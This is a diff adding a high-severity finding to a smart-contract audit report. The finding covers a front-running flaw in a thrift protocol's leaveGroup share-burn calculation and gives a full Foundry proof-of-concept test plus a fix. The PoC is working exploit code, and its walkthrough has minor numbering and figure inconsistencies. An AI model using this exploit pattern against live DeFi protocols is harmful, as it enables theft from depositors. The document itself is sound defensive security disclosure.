@@ -1045,6 +1045,246 @@ Replace ledger adjustment with an actual refund transfer:
 IERC20(tokenAddress).safeTransfer(msg.sender, refundAmount);
 ```
 
+## [H-14] Theft of funds from protocol users, leading to protocol insolvency.
+
+  ### Description:
+  The leaveGroup function calculates the number of shares to burn when a user receives a refund for their contribution. This calculation is performed using a formula that relies on the
+  spot price of a share at the moment of execution:
+
+  ```solidity
+sharesToBurn = totalAssets > 0 ? (refundAmount * totalGlobalShares) / totalAssets : 0;
+```
+
+  The totalAssets value is fetched live from the underlying Aave pool. A malicious actor can exploit this by temporarily inflating the totalAssets in the pool within the same block as the
+  victim's leaveGroup transaction. This front-running attack drastically increases the denominator of the division. Due to Solidity's integer arithmetic, the result for sharesToBurn is
+  truncated to a negligible value (or potentially zero), while the user still receives their full refundAmount.
+
+  ### Impact:
+  This vulnerability allows a malicious user to systematically drain value from all other participants in the protocol. An attacker can repeatedly perform the following sequence:
+   1. Contribute to a thrift group.
+   2. Call leaveGroup.
+   3. Front-run their own transaction by making a massive temporary deposit to the underlying Aave pool, artificially inflating totalAssets.
+   4. Their leaveGroup call executes, refunding their contribution but burning almost no shares.
+   5. Back-run the transaction to withdraw the massive temporary deposit.
+
+  The attacker is left with their original funds plus "phantom" shares that still represent a claim on the assets of honest users. Over time, this dilutes the value of all legitimate
+  shares, leading to a complete loss of funds for other users.
+
+  ### Proof of Concept (PoC)
+
+  Attack Scenario Walkthrough:
+ The Goal: The attack aims to make the sharesToBurn calculation in the leaveGroup function return a value close to zero, instead of the correct, much larger value.
+       - sharesToBurn = (refundAmount * totalGlobalShares) / totalAssets;
+
+   2. The Attack Execution:
+       - Pre-Attack: Alice contributes 100 * 1e18 USDC. The pool (miniSafe contract) correctly gets 100 * 1e18 shares.
+       - Front-run: Just before Alice calls leaveGroup, the test manipulates the totalAssets to be a massive number (100,000,000 * 1e18).
+       - Victim Tx: Alice calls leaveGroup. The contract calculates sharesToBurn. With the huge denominator, the result is 1000100000000000000 (~1 * 1e18), which is a tiny fraction of the
+         100 * 1e18 that should have been burned.
+       - Result: The log shows:
+           - Alice USDC Balance: 1000000000000000000000000 (She got her 100 USDC back, assertEq passed).
+           - Pool Shares Burned: 1000100000000000000 (~1 share).
+   3. Victim Transaction: Alice's call to leaveGroup executes. The vulnerable calculation is performed with the manipulated totalAssets value.
+   4. Result: The test logs and assertions confirmed the following outcome:
+       * Refund: Alice's USDC balance increased by 100, confirming she received her full refund.
+       * Shares Burned: Instead of burning the ~100 shares corresponding to her contribution, the thrift pool only burned ~1 share.
+       * Theft: Alice successfully withdrew her funds while retaining ~99% of the shares associated with that capital, effectively stealing that value from the other protocol
+         participants.
+
+  This PoC unequivocally demonstrates that the leaveGroup function can be exploited to steal funds.
+  ```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {MiniSafeAaveUpgradeable} from "../src/MiniSafeAaveUpgradeable.sol";
+import {MiniSafeTokenStorageUpgradeable} from "../src/MiniSafeTokenStorageUpgradeable.sol";
+import {MiniSafeAaveIntegrationUpgradeable} from "../src/MiniSafeAaveIntegrationUpgradeable.sol";
+import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
+import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
+
+// Self-contained interface for the mock
+interface IMockERC20 {
+    function mint(address to, uint256 amount) external;
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function balanceOf(address owner) external view returns (uint256);
+}
+
+// Mock integration contract
+contract MockAaveIntegration is MiniSafeAaveIntegrationUpgradeable {
+    mapping(address => uint256) public mockAssetBalances;
+
+    function setMockBalance(address token, uint256 amount) public {
+        mockAssetBalances[token] = amount;
+    }
+
+    function getATokenBalance(address tokenAddress) public view override returns (uint256) {
+        return mockAssetBalances[tokenAddress];
+    }
+    
+    function withdrawFromAave(address tokenAddress, uint256 amount, address to) external override returns (uint256) {
+        IMockERC20(tokenAddress).transfer(to, amount);
+        return amount;
+    }
+
+    function depositToAave(address, uint256 amount) external override returns (uint256) {
+        return amount;
+    }
+}
+
+// Mock ERC20 token
+contract MockERC20 is IMockERC20 {
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
+        name = _name;
+        symbol = _symbol;
+        decimals = _decimals;
+    }
+    function mint(address to, uint256 amount) external override { balanceOf[to] += amount; totalSupply += amount; }
+    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[to] += amount; return true; }
+    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
+    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
+}
+
+// **FIX**: Moved contract definition to the top level
+// Test contract that inherits from the main contract to override the withdrawal check
+contract TestMiniSafe is MiniSafeAaveUpgradeable {
+    function canWithdraw() public view override returns (bool) { return true; }
+}
+
+contract FrontrunTest is Test {
+    TestMiniSafe public miniSafe;
+    MiniSafeTokenStorageUpgradeable public tokenStorage;
+    MockAaveIntegration public aaveIntegration;
+    IMockERC20 public usdc;
+    ProxyAdmin public proxyAdmin;
+
+    address internal owner = address(0x1);
+    address internal alice = address(0x2);
+    address internal regularUser = address(0x4);
+
+    function setUp() public {
+        usdc = IMockERC20(address(new MockERC20("USD Coin", "USDC", 18)));
+
+        vm.startPrank(owner);
+        proxyAdmin = new ProxyAdmin(owner); 
+        MiniSafeTokenStorageUpgradeable tokenStorageImpl = new MiniSafeTokenStorageUpgradeable();
+        address tokenStorageProxy = address(new TransparentUpgradeableProxy(address(tokenStorageImpl), address(proxyAdmin), abi.encodeWithSelector(tokenStorageImpl.initialize.selector, owner)));
+        tokenStorage = MiniSafeTokenStorageUpgradeable(tokenStorageProxy);
+        aaveIntegration = new MockAaveIntegration();
+        TestMiniSafe miniSafeImpl = new TestMiniSafe();
+        address miniSafeProxy = address(new TransparentUpgradeableProxy(address(miniSafeImpl), address(proxyAdmin), ""));
+        miniSafe = TestMiniSafe(miniSafeProxy);
+        miniSafe.initialize(address(tokenStorage), address(aaveIntegration), owner);
+        tokenStorage.setManagerAuthorization(address(miniSafe), true);
+        tokenStorage.addSupportedToken(address(usdc), address(new MockERC20("aUSDC", "aUSDC", 18)));
+        miniSafe.setAllowedThriftToken(address(usdc), true);
+        vm.stopPrank();
+
+        usdc.mint(alice, 1_000_000 * 1e18);
+        usdc.mint(regularUser, 1_000_000 * 1e18);
+    }
+
+    function test_PoC_Frontrun_LeaveGroup() public {
+        // 1. SETUP
+        uint256 initialPoolAmount = 1_000_000 * 1e18;
+        vm.startPrank(regularUser);
+        usdc.approve(address(miniSafe), initialPoolAmount);
+        miniSafe.deposit(address(usdc), initialPoolAmount);
+        vm.stopPrank();
+
+        uint256 realAssetBalance = initialPoolAmount;
+        aaveIntegration.setMockBalance(address(usdc), realAssetBalance);
+        
+        uint256 contributionAmount = 100 * 1e18;
+        uint256 sharesExpectedForContribution;
+        
+        vm.startPrank(alice);
+        
+        uint256 futureStartDate = block.timestamp + 10 days;
+        uint256 groupId = miniSafe.createThriftGroup(contributionAmount, futureStartDate, false, address(usdc));
+
+        address[] memory order = new address[](1);
+        order[0] = alice;
+        miniSafe.setPayoutOrder(groupId, order);
+        miniSafe.activateThriftGroup(groupId);
+
+        vm.warp(futureStartDate + 1);
+
+        uint256 poolSharesBeforeContribution = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
+        usdc.approve(address(miniSafe), contributionAmount);
+        miniSafe.makeContribution(groupId);
+        uint256 poolSharesAfterContribution = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
+        sharesExpectedForContribution = poolSharesAfterContribution - poolSharesBeforeContribution;
+        
+        vm.stopPrank();
+
+        // 2. PRE-ATTACK STATE
+        uint256 aliceUsdcBefore = usdc.balanceOf(alice);
+        uint256 poolSharesBeforeAttack = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
+        console.log("--- PRE-ATTACK STATE ---");
+        console.log("Alice USDC Balance: ", aliceUsdcBefore);
+        console.log("Pool Share Balance: ", poolSharesBeforeAttack);
+        console.log("Expected Shares to Burn on Exit: ", sharesExpectedForContribution);
+
+        // 3. THE ATTACK
+        console.log("\n--- ATTACK BEGINS (targeting leaveGroup) ---");
+
+        uint256 inflatedAssets = 100_000_000 * 1e18;
+        aaveIntegration.setMockBalance(address(usdc), inflatedAssets);
+        console.log("Step A (Front-run): Inflated Total Assets to ->", aaveIntegration.getATokenBalance(address(usdc)));
+        
+        console.log("Step B (Victim's Tx): Alice calls leaveGroup...");
+        vm.startPrank(alice);
+        miniSafe.leaveGroup(groupId);
+        vm.stopPrank();
+
+        aaveIntegration.setMockBalance(address(usdc), realAssetBalance);
+        console.log("Step C (Back-run): Restored Total Assets");
+        console.log("\n--- ATTACK COMPLETE ---");
+
+        // 4. ASSERTIONS
+        uint256 aliceUsdcAfter = usdc.balanceOf(alice);
+        uint256 poolSharesAfterAttack = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
+        uint256 actualSharesBurned = poolSharesBeforeAttack - poolSharesAfterAttack;
+
+        console.log("\n--- POST-ATTACK STATE ---");
+        console.log("Alice USDC Balance:   ", aliceUsdcAfter);
+        console.log("Pool Share Balance:  ", poolSharesAfterAttack);
+        console.log("Actual Pool Shares Burned:   ", actualSharesBurned);
+
+        assertEq(aliceUsdcAfter, aliceUsdcBefore + contributionAmount, "FAIL: Alice did not receive her refund");
+        
+        assertTrue(actualSharesBurned < (sharesExpectedForContribution / 10), "FAIL: A significant number of shares were burned. Attack failed.");
+        
+        console.log("\nSUCCESS: Alice was refunded 100 USDC. The protocol should have burned ~100 shares, but only burned a negligible amount due to the exploit.");
+    }
+}
+
+  ```
+
+### Recommended Mitigation
+
+  To fix this vulnerability, the protocol must avoid using a spot price to calculate shares to burn on exit. The number of shares burned for a refund must be equal to the number of shares
+  that were minted for the corresponding contribution.
+
+   1. Store Minted Shares: When a user contributes to a group in the makeContribution function, the number of shares minted to the thrift pool (sharesToMint) is calculated. This value
+      should be stored in the ThriftGroup struct, linked to the user's contribution for that cycle.
+       * Example: group.cycleContributionShares[msg.sender] = sharesToMint;
+   2. Burn Stored Shares: In the leaveGroup function, replace the vulnerable calculation with a direct retrieval of the stored share amount.
+       * Example: uint256 sharesToBurn = group.cycleContributionShares[msg.sender];
+
+  By linking the shares burned directly to the shares minted, the calculation becomes independent of the asset-to-share ratio at the time of withdrawal, completely neutralizing the
+  front-running attack vector.
+
 ## Medium Level Severity Issues
 
 ## [M-1] Excess Contribution Amounts Are Permanently Trapped in Contract
